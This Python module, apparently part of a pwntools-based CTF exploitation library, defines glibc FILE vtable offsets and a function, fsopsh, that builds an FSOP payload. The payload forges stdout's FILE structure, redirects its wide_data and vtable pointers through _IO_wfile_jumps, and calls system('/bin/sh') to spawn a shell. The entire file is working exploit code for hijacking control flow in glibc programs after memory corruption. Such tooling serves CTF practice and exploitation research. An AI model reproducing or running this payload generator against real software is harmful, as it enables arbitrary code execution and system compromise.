# from .helpers import _require_ctx, pwnctx
from . import helpers as hlp
from pwn import flat

DUMMY = 0x00
DUMMY2 = 0x08
FINISH = 0x10
OVERFLOW = 0x18
UNDERFLOW = 0x20
UFLOW = 0x28
PBACKFAIL = 0x30
XSPUTN = 0x38
XSGETN = 0x40
SEEKOFF = 0x48
SEEKPOS = 0x50
SETBUF = 0x58
SYNC = 0x60
DOALLOCATE = 0x68
READ = 0x70
WRITE = 0x78
SEEK = 0x80
CLOSE = 0x88
STAT = 0x90
SHOWMANYC = 0x98
IMBUE = 0xa0

def fsopsh(func=None, arg=b"/bin/sh\0", file=None, trigger=XSPUTN, lock=None):
    r"""fsopsh(func=None, arg=b"/bin/sh\0", file=None, trigger=XSPUTN, lock=None) -> bytes

    Generate a fsop payload to call a function (usually system("/bin/sh"))
    
    Arguments:
        func(int): Address of the function to be called, libc's system by default
        arg(bytes): First argument of the call, /bin/sh by default
        file(int): Address of the file structure, libc's stdout by default
        trigger(int): Vtable entry to trigger call on, XSPUTN by default
        lock(int): Value to put as lock (an empty zone), file+0x800 by default
    """
    hlp._require_ctx()
    if  hlp.pwnctx.elf.bits != 64:
        raise NotImplementedError()

    file = file or hlp.pwnctx.libc.sym["_IO_2_1_stdout_"]
    lock = lock or file + 0x800
    func = func or hlp.pwnctx.libc.sym.system

    return flat({
        0x00: [0x3b01010101010101, arg],
        0x78: -1,
        0x88: lock, # empty zone as lock
        0x90: -1,
        0xa0: file + (0xe0 - 0xe0), # wide_data
        0xd0: func,
        0xd8: hlp.pwnctx.libc.sym["_IO_wfile_jumps"] - (trigger - OVERFLOW), # vtable
        0xe0: file + (0xe0 - 0xe0) + (0xd0 - 0x68), # wide_data->vtable,
    }, filler=b"\0")